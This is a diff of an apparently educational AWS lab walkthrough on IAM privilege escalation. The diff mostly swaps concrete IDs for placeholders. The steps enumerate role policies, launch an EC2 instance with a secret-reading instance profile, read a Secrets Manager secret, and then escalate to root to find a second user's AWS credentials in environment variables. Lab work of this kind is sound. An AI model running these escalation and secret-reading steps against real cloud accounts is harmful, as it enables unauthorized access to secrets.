@@ -28,7 +28,7 @@ See more in the documentation https://docs.aws.amazon.com/systems-manager/latest
 ## IAM privilige escalation
 ### Discover availible credentials 
 Once we logged in onto the ec2 instance we can discover if any IAM, API credenials are availible. Lets execute:
-```
+```bash
 aws sts get-caller-identity
 ```
 Your output should look like below:
@@ -38,7 +38,7 @@ Your output should look like below:
 We can see that the instance assumed role dpg-funny-panda-workstation. Lets see what permissions are attached to this role. We can do this by executing:
 
 ```bash
-aws iam list-attached-role-policies --role-name dpg-funny-panda-workstation
+aws iam list-attached-role-policies --role-name <your-role>
 ```
 Your output should look like below: 
 
@@ -48,8 +48,9 @@ Your output should look like below:
 
 We can see one IAM policy attached to the role, lets investigate what permissions are defined in the policy.
 Firs we need to look into the the policy:
-```
-aws iam get-policy --policy-arn arn:aws:iam::204521158369:policy/dpg-funny-panda-workstation
+
+```bash
+aws iam get-policy --policy-arn <policy-arn>
 ```
 
 Your output should look like below:
@@ -59,8 +60,9 @@ Your output should look like below:
 </p>
 
 Note the default policy version and execute:
-```
-aws iam get-policy-version --policy-arn arn:aws:iam::204521158369:policy/dpg-funny-panda-workstation --version-id v3
+
+```bash
+aws iam get-policy-version --policy-arn <policy-arn> --version-id <version>
 ```
 You should see the full IAM policy and your output should start with below:
 
@@ -79,14 +81,24 @@ Your last output should look like
   <img src="./images/secret-policy.png" />
 </p>
 
+Before getting any further, we can see that we will be constraint to `eu-west-1` region therfore we can setting it as default by executing
+
+```bash
+aws configure
+```
+You can skip first two entries by pressing enter and only add default region like below:
+
+<p align="center">
+  <img src="./images/configure.png" />
+</p>
+
 
 We can see that the policy allows us to read one of the secrets on the account. To do so we can create a new EC2 instance and attach secret-read-role to the instance profile and once we connect to the new server read the secret. 
 
 First, lets create a new key-pair:
-```
-aws ec2 create-key-pair \       
-   --key-name funny-panda \
-   --query 'KeyMaterial' --output text > ~/.ssh/funny-panda
+
+```bash
+aws ec2 create-key-pair --key-name your-panda --query 'KeyMaterial' --output text > ~/<your-panda>
 ```
 
 Now lets find out more about our current instance to deploy our new server in the same network. We can find our instance ID by executing:
@@ -95,7 +107,7 @@ aws sts get-caller-identity
 ```
 Once we grab the id we can execute:
 ```bash
-aws ec2 describe-instances --instance-ids i-02baacbaf617999e1
+aws ec2 describe-instances --instance-ids <instance-id>
 ```
 Your output should be a JSON file with the instance configuration like below.
 
@@ -106,40 +118,43 @@ Your output should be a JSON file with the instance configuration like below.
 Note the the AMI ID, Security group id, and subnet ids, next lets create a new EC2 instance with the command below:
 ```bash
 aws ec2 run-instances \
-    --image-id ami-00caa7df15d2e771f \
+    --image-id <ami-id> \
     --count 1 \
     --instance-type t2.micro \
-    --key-name funny-panda \
-    --security-group-ids sg-09587dd14a1f9db3d \
-    --subnet-id subnet-0dcf0c3a01abc9808 \
+    --key-name <your-panda> \
+    --security-group-ids <security-group-id> \
+    --subnet-id <subnet-id> \
     --block-device-mappings "[{\"DeviceName\":\"/dev/sdf\",\"Ebs\":{\"VolumeSize\":30,\"DeleteOnTermination\":false}}]" \
-    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=funny-panda}]' 'ResourceType=volume,Tags=[{Key=Name,Value=funny-panda-disk}]'
+    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=<your-panda>}]' 'ResourceType=volume,Tags=[{Key=Name,Value=<your-panda>-disk}]'
 ```
 Once your new instance is created - note its IP address. Next lets create an instance profile.
 ```bash
 aws iam create-instance-profile \
- --instance-profile-name funnypanda
+ --instance-profile-name <your-panda>
 ```
 and attach the role to the profile
 ```bash
 aws iam add-role-to-instance-profile \
---instance-profile-name funnypanda \
+--instance-profile-name <your-panda> \
 --role-name secret-read-role
 ```
 And finally associate the profile with our instance:
 ```bash
-aws ec2 associate-iam-instance-profile --iam-instance-profile Name=funnypanda --instance-id i-0516aa13e97073823
+aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<your-panda> --instance-id <instance-id>
 ```
 Now our new server is ready to be used. Lets modify the permissions of our key before we use it to ssh to the server
-```
-chmod 400 ~/.ssh/funny-panda
+
+```bash
+chmod 400 ~/.ssh/<your-panda>
 ```
 And ssh to the target server:
-```
-ssh ec2-user@@10.0.10.156 -i ~/.ssh/funny-panda
+
+```bash
+ssh ec2-user@<server-ip> -i ~/.ssh/<your-panda>
 ```
 Once logged in we can try our last command:
-```
+
+```bash
 aws secretsmanager get-secret-value --secret-id playground-secret
 ```
 
@@ -149,7 +164,8 @@ So we managed to read one of the secrets, but there is still one more around the
 sudo su
 ```
 Now once we are a root user lets try:
-```
+
+```bash
 aws sts get-caller-identity
 ```
 You should notice that this time we assumed a different AWS entity, AWS user, like below
@@ -166,7 +182,7 @@ env | grep AWS
 Now lets see what permissions we have attached to this user.
 
 ```bash
-aws iam list-attached-user-policies --user-name dpg-sweet-panda
+aws iam list-attached-user-policies --user-name <username>
 ```
 Looks like there are no policies attached:
 <p align="center">
@@ -175,7 +191,7 @@ Looks like there are no policies attached:
 Lets see if user has any inline policy then.
 
 ```bash
-aws iam list-user-policies --user-name dpg-sweet-panda
+aws iam list-user-policies --user-name <username>
 ```
 <p align="center">
   <img src="./images/user-inline.png" />
@@ -183,7 +199,7 @@ aws iam list-user-policies --user-name dpg-sweet-panda
 There is an inline policy attached to this user - let's investigate further
 
 ```bash
-aws iam get-user-policy --user-name dpg-sweet-panda --policy-name policy-dpg-sweet-panda
+aws iam get-user-policy --user-name <username> --policy-name <policyname>
 ```
 You should notice a familiar statement in the policy
 <p align="center">
